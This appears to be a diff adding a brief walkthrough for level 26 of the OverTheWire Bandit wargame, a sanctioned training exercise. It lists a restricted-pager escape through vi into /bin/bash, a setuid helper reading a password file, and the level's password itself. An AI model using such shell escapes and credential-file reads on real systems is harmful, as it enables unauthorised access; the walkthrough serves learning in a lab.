@@ -1,0 +1,14 @@
+level 26 :
+Commands used are
+Bandit Level 26 — Commands & Why
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+→ Trigger the restricted pager shell.
+v
+→ Open vi from the pager.
+:set shell=/bin/bash
+→ Set bash as the shell for vi.
+:shell
+→ Spawn a real shell
+./bandit27-do cat /etc/bandit_pass/bandit27
+Password:
+upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
